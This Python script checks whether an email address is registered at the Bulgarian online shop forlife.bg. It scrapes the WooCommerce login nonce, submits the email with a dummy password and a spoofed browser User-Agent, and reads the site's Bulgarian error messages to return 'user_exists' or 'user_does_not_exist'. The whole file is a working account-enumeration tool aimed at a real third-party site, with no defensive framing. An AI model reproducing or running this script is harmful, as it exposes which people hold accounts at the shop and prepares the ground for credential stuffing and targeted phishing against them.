import requests
from bs4 import BeautifulSoup

def check_forlife_email(email):
    session = requests.Session()

    try:
        initial_url = "https://www.forlife.bg/my-account"
        response = session.get(initial_url)
        response.raise_for_status()
    except requests.RequestException:
        return "request_error"

    try:
        soup = BeautifulSoup(response.text, 'html.parser')
        nonce_input = soup.find("input", {"name": "woocommerce-login-nonce"})
        if nonce_input and nonce_input["value"]:
            login_nonce = nonce_input["value"]
        else:
            return "request_error"
    except Exception:
        return "request_error"

    payload = {
        "username": email,
        "password": "321321321",
        "woocommerce-login-nonce": login_nonce,
        "_wp_http_referer": "/my-account",
        "login": "Влизане"
    }
    
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }

    try:
        login_url = "https://www.forlife.bg/my-account"
        response = session.post(login_url, headers=headers, data=payload)
        response.raise_for_status()
    except requests.RequestException:
        return "request_error"

    if "Паролата, която въведохте за имейл" in response.text:
        return "user_exists"
    elif "Непознат имейл адрес" in response.text:
        return "user_does_not_exist"
    else:
        return "request_error"